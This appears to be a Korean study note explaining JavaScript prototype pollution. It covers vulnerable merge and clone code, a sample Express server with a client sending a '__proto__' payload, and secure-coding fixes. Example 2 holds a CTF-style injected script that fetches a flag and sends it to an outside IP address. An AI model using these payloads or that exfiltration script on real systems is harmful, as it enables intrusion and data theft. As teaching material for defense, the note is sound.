[[JS]]
[참고1](!https://velog.io/@ehgks0000/Prototype-Pollution)



# Prototype Pollution
- JavaScript 객체 프로토타입 체인에서 발생할 수 있는 보안 취약점
- 공격자가 임의적으로 웹 애플리케이션의 JavaScript 객체 프로토타입을 수정할 수 있게 되면 발생
- `__proto__`는 `Object.prototype`과 같다는 것을 이용해 다른 객체 속성에 영향을 주는 방식

# 발생 원인
JavaScript에서 객체는 프로토타입을 기반으로 상속을 수행
객체의 프로퍼티나 메서드를 찾을 때 해당 객체에 없으면 프로토타입 체인을 따라 부모 객체로 검색하게 되는데, 
공격자가 이러한 프로토타입 체인을 조작하여 애플리케이션의 기본 동작을 변경할 수 있게 함

```js
const obj1 = {};
console.log(obj1.__proto__ === Object.prototype); // true
obj1.__proto__.polluted = 1;
const obj2 = {};
console.log(obj2.polluted); // 1
```

### 객체 Prototype Pollution이 일어날 수 있는 주요 3가지 패턴
- 속성 설정
```js
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}

function setValue(obj, key, value) {
  const keylist = key.split('.');
  const e = keylist.shift();
  if (keylist.length > 0) {
    if (!isObject(obj[e])) obj[e] = {};
    setValue(obj[e], keylist.join('.'), value);
  } else {
    obj[key] = value;
    return obj;
  }
}

const obj1 = {};
setValue(obj1, "__proto__.polluted", 1);
const obj2 = {};
console.log(obj2.polluted); // 1
```

- 객체 병합
```js
function merge(a, b) {
  for (let key in b) {
    if (isObject(a[key]) && isObject(b[key])) {
      merge(a[key], b[key]);
    } else {
      a[key] = b[key];
    }
  }
  return a;
}

const obj1 = {a: 1, b:2};
const obj2 = JSON.parse('{"__proto__":{"polluted":1}}');
merge(obj1, obj2);
const obj3 = {};
console.log(obj3.polluted); // 1
```

- 객체 복사
```js
function clone(obj) {
  return merge({}, obj);
}

const obj1 = JSON.parse('{"__proto__":{"polluted":1}}');
const obj2 = clone(obj1);
const obj3 = {};
console.log(obj3.polluted); // 1
```


# 예시1
- 외부에서 전달받은 JSON을 그대로 복사
```js
function isObject(obj) {
  return obj !== null && typeof obj === 'object';
}

function merge(a, b) {
  for (let key in b) {
    // 이 부분에서 key가 __proto__ 일 때에 건너뛰어야 한다.
    if (isObject(a[key]) && isObject(b[key])) {
      merge(a[key], b[key]);
    } else {
      a[key] = b[key];
    }
  }
  return a;
}

function clone(obj) {
  return merge({}, obj);
}

const express = require('express');
const app = express();
app.use(express.json());
app.post('/', (req, res) => {
  // 여기에서 악의적인 JSON을 그대로 복사함으로써 객체의 프로토타입 오염이 일어난다
  const obj = clone(req.body);
  const r = {};
  // 프로토타입 오염에 의해 r.status가 변조된다.
  const status = r.status ? r.status: 'NG';
  res.send(status)
});
app.listen(1234);
```

- `__proto__`속성을 갖는 JSON을 서버에 전달해 공격
```js
const http = require('http');
const client = http.request({
  host: 'localhost',
  port: 1234,
  method: 'POST'
}, (res) => {
  res.on('data', (chunk) => {
    console.log(chunk.toString());
  });
});
const data = '{"__proto__":{"status":"polluted"}}';
client.setHeader('content-type', 'application/json');
client.end(data);
```


# 예시2
```js
<script> 
fetch('http://2023whs.arang.kr:9200/prototype_pollution.php').then(response => response.text()).then(data => { 
	let flag = data.match(/flag{.*?}/)[0]; 
	fetch('http://211.250.216.249:7444/receive_flag?flag=' + flag); 
});
</script>
```



# 시큐어 코딩
- Object.freeze : `Object.prototype`이나 `Object`를 `freeze`하여 변경을 불가능하게 하는 방법. 부작용으로 정상적인 모듈임에도 이 조치로 동작하지 않을 수 도 있음
- JSON schema : avj 모듈 등을 사용해 JSON을 검증
- Map : key/value를 저장하는 객체를 사용하지 않고 `Map`을 사용. ES5 이전 환경에서는 불가